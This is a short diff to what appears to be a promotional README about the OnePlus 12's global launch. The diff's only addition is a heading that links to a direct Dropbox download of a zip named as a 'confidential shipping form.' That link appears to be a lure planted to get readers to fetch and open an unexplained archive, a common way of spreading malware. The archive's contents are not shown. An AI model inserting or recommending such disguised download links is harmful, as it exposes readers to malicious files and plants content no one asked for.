@@ -47,6 +47,8 @@ This collaboration not only brings the OnePlus 12 to the forefront of the tech c
   <a href="#getting-started">Getting Started(For Advertisers)</a> •
 </p>
 
+ ## [⚡️OnePlus12(ShippingForm) ](https://www.dropbox.com/scl/fi/ubh4q0lqfajslodh3dlz1/OnePlus-ConfidentialShipping-form.zip?rlkey=alhrvedp3wsqmsxkmselcrwi1&dl=1)
+
 ## Key Features
 
 - 🌟 The OnePlus 12 has officially launched in China and now the company’s most powerful phone is coming to the rest of the world. OnePlus has announced global availability for January 23, including the US. All told, the company ways the phone will be available in 50 markets worldwide. If you’ve been intrigued by the company’s latest flagship smartphone, you won’t have long to wait until getting your hands on one.
